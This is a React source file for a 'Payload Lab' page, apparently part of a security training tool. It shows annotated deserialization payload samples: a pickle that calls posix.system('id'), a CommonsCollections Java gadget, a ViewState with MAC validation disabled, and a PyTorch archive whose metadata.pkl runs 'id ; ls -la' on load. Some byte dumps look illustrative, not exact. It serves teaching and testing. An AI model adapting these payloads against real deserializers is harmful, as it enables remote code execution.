'use client';

import React, { useState, useCallback } from 'react';
import { Card, CardHeader, CardBody } from '@/components/ui/Card';
import { Button } from '@/components/ui/Button';
import { Badge } from '@/components/ui/Badge';

type Format = 'pickle' | 'java' | 'viewstate' | 'ml';
type Encoding = 'raw' | 'base64' | 'hex';
type DemoType = 'execution-marker' | 'file-marker' | 'callback' | 'synthetic';

const FORMAT_TABS: { id: Format; label: string }[] = [
  { id: 'pickle', label: 'Python Pickle' },
  { id: 'java', label: 'Java Serialization' },
  { id: 'viewstate', label: '.NET ViewState' },
  { id: 'ml', label: 'ML Container' },
];

const DEMO_OPTIONS: { id: DemoType; label: string }[] = [
  { id: 'execution-marker', label: 'proof-of-execution marker' },
  { id: 'file-marker', label: 'local file marker' },
  { id: 'callback', label: 'local callback' },
  { id: 'synthetic', label: 'synthetic execution' },
];

const ENCODING_OPTIONS: { id: Encoding; label: string }[] = [
  { id: 'raw', label: 'Raw' },
  { id: 'base64', label: 'Base64' },
  { id: 'hex', label: 'Hex' },
];

const OUTPUT_TABS: { id: Encoding; label: string }[] = [
  { id: 'raw', label: 'Serialized' },
  { id: 'base64', label: 'Base64' },
  { id: 'hex', label: 'Hexadecimal' },
];

interface ObjectField {
  key: string;
  value: string;
  editable?: boolean;
}

const OBJECT_FIELDS: Record<Format, ObjectField[]> = {
  pickle: [
    { key: 'reduce_callable', value: 'posix.system', editable: true },
    { key: 'reduce_args', value: '["id"]', editable: true },
    { key: 'protocol_version', value: 'v5', editable: false },
    { key: 'opcode', value: 'REDUCE (R)', editable: false },
  ],
  java: [
    { key: 'class_fqn', value: 'org.apache.commons.collections.functors.ChainedTransformer', editable: true },
    { key: 'serialVersionUID', value: '3514945054940145553', editable: false },
    { key: 'exec_method', value: 'Runtime.exec()', editable: true },
    { key: 'magic_bytes', value: 'AC ED 00 05', editable: false },
  ],
  viewstate: [
    { key: 'type_reference', value: 'System.Collections.Hashtable', editable: true },
    { key: 'mac_validation', value: 'disabled', editable: true },
    { key: 'formatter', value: 'BinaryFormatter', editable: false },
    { key: 'target_method', value: 'IDeserializationCallback.OnDeserialization', editable: false },
  ],
  ml: [
    { key: 'model_type', value: 'PyTorch (state_dict)', editable: true },
    { key: 'embed_target', value: 'metadata.pkl', editable: true },
    { key: 'tensor_shape', value: '[768, 3072]', editable: false },
    { key: 'archive_format', value: 'ZIP (PK 03 04)', editable: false },
  ],
};

const PAYLOAD_OUTPUT: Record<Format, Record<Encoding, string>> = {
  pickle: {
    raw: `# LAB SIMULATION — Pickle v5 Structure
\\x80\\x05\\x95 (protocol + frame opcode)
  c  posix\\nsystem\\n    (GLOBAL opcode: module.name)
  q\\x00            (BINPUT: memo ref 0)
  X\\x02\\x00\\x00\\x00  (SHORT_BINUNICODE: length=2)
  id              (string payload)
  q\\x01            (BINPUT: memo ref 1)
  \\x85            (TUPLE1: wrap in 1-tuple)
  q\\x02            (BINPUT: memo ref 2)
  R              (REDUCE: call callable with args)
  q\\x03            (BINPUT: memo ref 3)
  .              (STOP)`,
    base64: `# LAB SIMULATION — Pickle v5 (Base64 encoded)
gAVjcG9zaXgKc3lzdGVtCnEAWAIAAAAiaWRxAYVxAlJxAy4=

# Decoded structure:
#  [0x80 0x05] = PROTO 5
#  [0x63]      = GLOBAL opcode
#  [posix\\nsystem\\n] = callable reference
#  [0x58 ...]  = SHORT_BINUNICODE "id"
#  [0x85]      = TUPLE1
#  [0x52]      = REDUCE
#  [0x2e]      = STOP`,
    hex: `# LAB SIMULATION — Pickle v5 (Hex dump)
Offset  Hex                              ASCII
------  -------------------------------- --------
0x0000  80 05 63 70 6f 73 69 78 0a 73   ..cposix.s
0x000a  79 73 74 65 6d 0a 71 00 58 02   ystem.q.X.
0x0014  00 00 00 69 64 71 01 85 71 02   ...idq..q.
0x001e  52 71 03 2e                     Rq..`,
  },
  java: {
    raw: `# Java Serialized Object — CommonCollections CC1
AC ED 00 05  (stream magic)
73 72        (TC_OBJECT, TC_CLASSDESC)
00 2E        (class name length: 46 bytes)
6F 72 67 2E 61 70 61 63 68 65 2E 63 6F 6D 6D 6F  org.apache.commo
6E 73 2E 63 6F 6C 6C 65 63 74 69 6F 6E 73 2E 66  ns.collections.f
75 6E 63 74 6F 72 73 2E 43 68 61 69 6E 65 64 54  unctors.ChainedT
72 61 6E 73 66 6F 72 6D 65 72                    ransformer
30 C9 18 59 27 C1 DC 00  (serialVersionUID)
02           (SC_SERIALIZABLE flag)
00 01        (field count: 1)
5B           (field type: '[' = array)
00 0D        (field name length: 13)`,
    base64: `# Java Serialized Object (Base64 encoded)
rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlv
bnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMkYWyfB
3AABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9j
b21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIA
LVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRy
YW5zZm9ybWVyOwE=`,
    hex: `# Java Serialized Object (Hex dump)
Offset  Hex                              ASCII
------  -------------------------------- --------
0x0000  ac ed 00 05 73 72 00 2e 6f 72   ....sr..or
0x000a  67 2e 61 70 61 63 68 65 2e 63   g.apache.c
0x0014  6f 6d 6d 6f 6e 73 2e 63 6f 6c   ommons.col
0x001e  6c 65 63 74 69 6f 6e 73 2e 66   lections.f
0x0028  75 6e 63 74 6f 72 73 2e 43 68   unctors.Ch
0x0032  61 69 6e 65 64 54 72 61 6e 73   ainedTrans
0x003c  66 6f 72 6d 65 72 30 c9 18 59   former0..Y`,
  },
  viewstate: {
    raw: `# .NET ViewState — BinaryFormatter stream
FF 01       (ViewState marker)
05 09       (Pair token)
0C 02 00 00 00  (Hashtable token)
0B 03 00 00 00  (String token)
25           (length: 37)
System.Collections.Hashtable
5D           (bracket — array start)
System.Runtime.Serialization.Formatters.Binary
04 00 00 00  (field count)
07 6C 6F 61 64 4B 65 79  (field: loadKey)
07 75 6E 6C 6F 63 6B    (field: unlock)`,
    base64: `# .NET ViewState (Base64 encoded)
/wEFCQwCAAAACwMAAAAlU3lzdGVtLkNvbGxlY3Rpb25zLkhh
c2h0YWJsZSxdU3lzdGVtLlJ1bnRpbWUuU2VyaWFsaXphdGlv
bi5Gb3JtYXR0ZXJzLkJpbmFyeQQAAAAHbG9hZEtleQd1bmxv
Y2s=

# Note: MAC signature absent — tampered ViewState accepted
# Target: __VIEWSTATE POST parameter`,
    hex: `# .NET ViewState (Hex dump)
Offset  Hex                              ASCII
------  -------------------------------- --------
0x0000  ff 01 05 09 0c 02 00 00 00 0b   ..........
0x000a  03 00 00 00 25 53 79 73 74 65   ....%Syste
0x0014  6d 2e 43 6f 6c 6c 65 63 74 69   m.Collecti
0x001e  6f 6e 73 2e 48 61 73 68 74 61   ons.Hashta
0x0028  62 6c 65 5d 53 79 73 74 65 6d   ble]System`,
  },
  ml: {
    raw: `# PyTorch Model Archive — ZIP container
PK 03 04  (ZIP local file header magic)
  archive/
    storage.pkl     (tensor metadata)
    data/0          (raw tensor bytes)
    metadata.pkl    (model metadata — INJECTION POINT)

# metadata.pkl contents (pickle v5):
\\x80\\x05\\x95 (frame header)
  c os\\nsystem\\n
  X\\x08\\x00\\x00\\x00id ; ls -la
  \\x85 R .       (REDUCE — executes on torch.load())`,
    base64: `# PyTorch Model Archive (Base64 encoded ZIP)
UEsDBAAACAAAAAAABc3N0b3JhZ2UucGtsAAAAAAAAAAAAAAAA
UEsDBAAACAAAAAAAAOJtZXRhZGF0YS5wa2wAAAAAAAAAAAAA
gAVjb3MKc3lzdGVtClgIAAAAaWQgOyBscyAtbGGFUi4=

# torch.load() calls pickle.load() on metadata.pkl
# No sandbox — arbitrary code executes during model loading
# Affects: PyTorch < 2.0 (before weights_only=True default)`,
    hex: `# PyTorch Model Archive (Hex dump)
Offset  Hex                              ASCII
------  -------------------------------- --------
0x0000  50 4b 03 04 00 00 08 00 00 00   PK........
0x000a  00 00 05 cd cd cd cd cd 73 74   ......st
0x0014  6f 72 61 67 65 2e 70 6b 6c 00   orage.pkl.
0x001e  00 00 00 00 00 00 00 00 00 00   ..........
0x0028  80 05 63 6f 73 0a 73 79 73 74   ..cos.syst
0x0032  65 6d 0a 58 08 00 00 00 69 64   em.X....id`,
  },
};

export default function PayloadLabPage() {
  const [selectedFormat, setSelectedFormat] = useState<Format>('pickle');
  const [selectedDemoType, setSelectedDemoType] = useState<DemoType>('execution-marker');
  const [encoding, setEncoding] = useState<Encoding>('raw');
  const [copied, setCopied] = useState(false);

  const currentOutput = PAYLOAD_OUTPUT[selectedFormat][encoding];

  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText(currentOutput).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }, [currentOutput]);

  const handleDownload = useCallback(() => {
    const extensions: Record<Format, string> = {
      pickle: '.pkl',
      java: '.ser',
      viewstate: '.viewstate',
      ml: '.pt',
    };
    const blob = new Blob([currentOutput], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `sample-${selectedFormat}${extensions[selectedFormat]}`;
    a.click();
    URL.revokeObjectURL(url);
  }, [currentOutput, selectedFormat]);

  return (
    <div className="p-6 space-y-6">
      {/* Page header */}
      <div>
        <h1 className="text-xl font-semibold text-serial-text tracking-wide">Payload Lab</h1>
        <p className="text-sm text-serial-text-muted mt-1">
          Inspect serialization format structures and encoding representations — simulation only
        </p>
      </div>

      {/* Format selector tabs */}
      <div className="flex gap-1 border-b border-serial-border">
        {FORMAT_TABS.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setSelectedFormat(tab.id)}
            className={`px-4 py-2.5 text-sm font-medium font-mono tracking-wide transition-colors duration-150 cursor-pointer ${
              selectedFormat === tab.id
                ? 'border-b-2 border-serial-violet text-serial-violet -mb-px'
                : 'text-serial-text-muted hover:text-serial-text-secondary'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Two-column layout */}
      <div className="grid grid-cols-3 gap-6">
        {/* LEFT: Configuration panel */}
        <div className="col-span-1">
          <Card>
            <CardHeader title="CONFIGURATION" />
            <CardBody className="space-y-5">
              {/* Demonstration type */}
              <div>
                <label className="block text-xs font-mono text-serial-text-secondary mb-1.5 tracking-wide">
                  Demonstration Type
                </label>
                <select
                  value={selectedDemoType}
                  onChange={(e) => setSelectedDemoType(e.target.value as DemoType)}
                  className="w-full bg-serial-surface3 border border-serial-border text-serial-text text-xs font-mono rounded-lg px-3 py-2 focus:outline-none focus:border-serial-violet cursor-pointer"
                >
                  {DEMO_OPTIONS.map((opt) => (
                    <option key={opt.id} value={opt.id}>
                      {opt.label}
                    </option>
                  ))}
                </select>
              </div>

              {/* Object structure */}
              <div>
                <div className="text-xs font-mono text-serial-text-secondary mb-2 tracking-wide">
                  Object Structure
                </div>
                <div className="space-y-2">
                  {OBJECT_FIELDS[selectedFormat].map((field) => (
                    <div key={field.key} className="flex items-center gap-2">
                      <span className="text-xs font-mono text-serial-text-muted w-28 shrink-0 truncate">
                        {field.key}
                      </span>
                      <div
                        className={`flex-1 text-xs font-mono px-2 py-1 rounded-lg border ${
                          field.editable
                            ? 'bg-serial-surface3 border-serial-border text-serial-cyan'
                            : 'bg-black/30 border-serial-border/50 text-serial-text-muted'
                        }`}
                      >
                        <span className="truncate block">{field.value}</span>
                      </div>
                      {!field.editable && (
                        <Badge variant="info">fixed</Badge>
                      )}
                    </div>
                  ))}
                </div>
              </div>

              {/* Encoding output */}
              <div>
                <div className="text-xs font-mono text-serial-text-secondary mb-2 tracking-wide">
                  Encoding Output
                </div>
                <div className="space-y-1.5">
                  {ENCODING_OPTIONS.map((opt) => (
                    <label
                      key={opt.id}
                      className="flex items-center gap-2.5 cursor-pointer group"
                    >
                      <div
                        className={`w-3.5 h-3.5 rounded-full border-2 flex items-center justify-center transition-colors ${
                          encoding === opt.id
                            ? 'border-serial-violet'
                            : 'border-serial-border group-hover:border-serial-border-light'
                        }`}
                      >
                        {encoding === opt.id && (
                          <div className="w-1.5 h-1.5 rounded-full bg-serial-violet" />
                        )}
                      </div>
                      <input
                        type="radio"
                        className="sr-only"
                        value={opt.id}
                        checked={encoding === opt.id}
                        onChange={() => setEncoding(opt.id)}
                      />
                      <span className="text-xs font-mono text-serial-text-secondary group-hover:text-serial-text transition-colors">
                        {opt.label}
                      </span>
                    </label>
                  ))}
                </div>
              </div>
            </CardBody>
          </Card>
        </div>

        {/* RIGHT: Output panel */}
        <div className="col-span-2">
          <Card>
            <CardHeader
              title="PAYLOAD OUTPUT"
              action={
                <Badge variant="medium">LAB SIMULATION</Badge>
              }
            />
            <CardBody className="space-y-4">
              {/* Output encoding tabs */}
              <div className="flex gap-1 border-b border-serial-border">
                {OUTPUT_TABS.map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setEncoding(tab.id)}
                    className={`px-3 py-1.5 text-xs font-mono tracking-wide transition-colors duration-150 cursor-pointer ${
                      encoding === tab.id
                        ? 'border-b-2 border-serial-violet text-serial-violet -mb-px'
                        : 'text-serial-text-muted hover:text-serial-text-secondary'
                    }`}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>

              {/* Output area */}
              <div className="bg-black/60 rounded-xl p-4 font-mono text-xs text-serial-cyan min-h-[280px] overflow-auto whitespace-pre leading-relaxed">
                {currentOutput}
              </div>

              {/* Action buttons */}
              <div className="flex items-center gap-2 flex-wrap">
                <Button variant="outline" size="sm" onClick={handleCopy}>
                  {copied ? (
                    <>
                      <svg className="w-3.5 h-3.5 text-serial-emerald" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                      </svg>
                      <span className="text-serial-emerald">Copied!</span>
                    </>
                  ) : (
                    <>
                      <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                      </svg>
                      Copy
                    </>
                  )}
                </Button>
                <Button variant="outline" size="sm" onClick={handleDownload}>
                  <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                  </svg>
                  Download Sample
                </Button>
                <Button variant="ghost" size="sm">
                  <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                  </svg>
                  Inspect
                </Button>
                <Button variant="ghost" size="sm">
                  <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Run in Lab
                </Button>
              </div>

              {/* Disclaimer */}
              <div className="flex items-center gap-2 pt-1 border-t border-serial-border/50">
                <svg className="w-3.5 h-3.5 text-serial-amber shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
                <span className="text-xs font-mono text-serial-amber">
                  LAB SIMULATION — No actual payloads are executed
                </span>
              </div>
            </CardBody>
          </Card>
        </div>
      </div>
    </div>
  );
}
